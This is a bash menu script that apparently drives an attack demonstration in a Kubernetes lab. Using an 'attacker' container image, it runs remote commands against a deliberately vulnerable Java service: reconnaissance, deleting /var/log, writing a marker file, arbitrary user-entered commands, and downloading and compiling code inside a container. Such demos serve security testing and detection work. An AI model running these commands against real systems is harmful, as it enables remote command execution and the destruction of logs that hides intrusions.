#!/bin/bash
# Bash Menu Script Example

# Fetch victim URL using kubectl
URL="http://$(kubectl get svc -n victims --selector=app=java-goof -o jsonpath='{.items[*].spec.clusterIP}'):8080"

# Set color green for echo output
green=$(tput setaf 2)

PS3='Select the attack: '
options=("whoami" "list services and processes" "delete logs" "write a file" "custom command" "Terminal Shell in Container" "Compile After Delivery"  "Hail Mary attacks" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "whoami")
            echo "💬${green}Showing what users is running the application..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "whoami"
            ;;
        "list services and processes")
            echo "💬${green}Showing running services and processes..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "service  --status-all && ps -aux"
            ;;
        "delete logs")
            echo "💬${green}Showing current log files..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /var/log"
            echo "💬${green}Deleting the log folder..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "rm -rf /var/log"
            echo "💬${green}Showing the log folder was deleted..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /var/log"
            ;;

        "write a file")
            echo "💬${green}Showing current files..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /tmp"
            echo "💬${green}Create a new file..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "touch /tmp/TREND_HAS_BEEN_HERE"
            echo "💬${green}Showing files again..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /tmp"
            ;;
        "Terminal Shell in Container")
            echo "💬${green}Running shell in container..."
            kubectl run attacker-$RANDOM --rm -i --tty --image ubuntu/apache2:2.4-22.04_beta -- bash -c "ls -lh"
            ;;
        "Compile After Delivery")
            echo "💬${green}Running Compile After Delivery..."
            kubectl run attacker-$RANDOM --rm -i --tty --image ubuntu/apache2:2.4-22.04_beta -- bash -c "apt update;apt install wget gcc -y;wget https://raw.githubusercontent.com/SoOM3a/c-hello-world/master/hello.c;gcc hello.c;ls -lh"
            ;;
        "Hail Mary attacks")
            echo "💬${green}☠☠☠☠☠☠ RUNNING EVERYTHING ☠☠☠☠☠☠☠"
            echo "💬${green}Showing what users is running the application..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "whoami"
            echo "💬${green}Showing running services and processes..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "service  --status-all && ps -aux"
            echo "💬${green}Showing current log files..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /var/log"
            echo "💬${green}Deleting the log folder..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "rm -rf /var/log"
            echo "💬${green}Showing the log folder was deleted..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /var/log"
            echo "💬${green}Showing current files..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /tmp"
            echo "💬${green}Create a new file..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "touch /tmp/TREND_HAS_BEEN_HERE"
            echo "💬${green}Showing files again..."
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "ls -lah /tmp"
            echo "💬${green}Running shell in container..."
            kubectl run attacker-$RANDOM --rm -i --tty --image ubuntu/apache2:2.4-22.04_beta -- bash -c "ls -lh"
            echo "💬${green}Running Compile After Delivery..."
            kubectl run attacker-$RANDOM --rm -i --tty --image ubuntu/apache2:2.4-22.04_beta -- bash -c "apt -qq update;apt -qq install wget gcc -y;wget https://raw.githubusercontent.com/SoOM3a/c-hello-world/master/hello.c;gcc hello.c;ls -lh"
            ;;
        "custom command")
            echo "💬${green}Enter command:"
            read -r USER_COMMAND
            kubectl run -n attackers attacker-$RANDOM --rm -i --tty --image public.ecr.aws/k1q0d6m0/attacker "$URL" "${USER_COMMAND}"
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done